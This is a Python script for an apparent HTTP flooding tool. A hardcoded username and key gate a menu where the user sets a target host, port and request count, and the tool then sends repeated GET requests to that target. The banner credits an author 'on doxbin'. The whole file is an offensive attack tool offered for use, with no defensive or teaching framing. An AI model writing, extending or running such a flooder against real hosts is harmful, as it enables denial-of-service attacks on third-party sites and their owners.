import os
import re
import platform
import subprocess
import time
from colorama import Fore, Style
import shutil
import requests

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_centered_colored_text(text, color):
    term_width, _ = shutil.get_terminal_size()
    text_lines = text.split('\n')
    max_line_length = max(len(line) for line in text_lines)
    for line in text_lines:
        spaces_to_center = max((term_width - max_line_length) // 2, 0)
        print(color + ' ' * spaces_to_center + line + Style.RESET_ALL)

def print_horizontal_line(color, length):
    print(color + '-' * length + Style.RESET_ALL)

def validate_host(host):
    ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    domain_pattern = re.compile(r"^(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$")
    return ip_pattern.match(host) or domain_pattern.match(host)

def validate_port(port):
    port_pattern = re.compile(r"^\d{1,5}$")
    return port_pattern.match(port)

def validate_amount(amount):
    amount_pattern = re.compile(r"^\d+$")
    return amount_pattern.match(amount)

def http_attack(host, port, amount):
    url = f"http://{host}:{port}/" if port else f"http://{host}/"
    try:
        print("[+] Starting HTTP attack...")
        for _ in range(int(amount)):
            response = requests.get(url)
            print(f"[+] Sent request to {url}, status code: {response.status_code}")
            time.sleep(0.1)
    except Exception as e:
        print(f"Error: {e}")

correct_username = "admin"
correct_key = "gHz1lW9kNp3sR5jY2mX8oA7dH6tL4eU0iF1cV2bJ3nM4qZ5xK6vP7yO8uI9"

username = input("Enter Username: ")
key = input("Enter Key: ")

if username == correct_username and key == correct_key:
    clear_terminal()
    text = """
    [Some fancy ASCII art here]
    Time Remaining: inf   Logged as: admin 
    """

    additional_text = """
    [$] Made by Bluer on doxbin
    [$] Version: 2.0.1
    [$] Special thanks to PsyFlood for design ideas
    [$] Type `cmd` If You dont know commands [+]
    """

    help_text = """
    Help:

    >>>> /host - Enter the Host Domain or Ip Address
    >>>> /port - Enter a custom port if you have one, or just don't use it will use port 80
    >>>> /amount - Enter a custom amount of attack, Default 1000
    >>>> /start - Will start attacking and display outputs on the console
    """

    user_host = None
    user_port = None
    user_amount = "1000"
    clear_terminal()
    print_centered_colored_text(text, Fore.RED)
    print_horizontal_line(Fore.WHITE, shutil.get_terminal_size().columns)
    print_horizontal_line(Fore.WHITE, shutil.get_terminal_size().columns)
    print_centered_colored_text(additional_text, Fore.YELLOW)
    print_horizontal_line(Fore.WHITE, shutil.get_terminal_size().columns)

    while True:
        user_input = input(Fore.BLUE + "admin >> " + Style.RESET_ALL)
        if user_input.lower() == "/cmd":
            print(help_text)
        elif user_input.lower().startswith("/host "):
            host_input = user_input[6:]
            if validate_host(host_input):
                user_host = host_input
                print(f"[+] Target saved: {user_host}")
            else:
                print(f"[-] Invalid host: {host_input}")
        elif user_input.lower().startswith("/port "):
            port_input = user_input[6:]
            if validate_port(port_input):
                user_port = port_input
                print(f"[+] Port saved: {user_port}")
            else:
                print(f"[-] Invalid port: {port_input}")
        elif user_input.lower().startswith("/amount "):
            amount_input = user_input[8:]
            if validate_amount(amount_input):
                user_amount = amount_input
                print(f"[+] Amount saved: {user_amount}")
            else:
                print(f"[-] Invalid amount: {amount_input}")
        elif user_input.lower() == "/start":
            if user_host:
                http_attack(user_host, user_port, user_amount)
            else:
                print(Fore.BLUE + "[+] Please enter target host, port, and amount before starting." + Style.RESET_ALL)
        else:
            print("[-] Invalid command")
else:
    print("\033[91mInvalid name or key\033[0m")
      
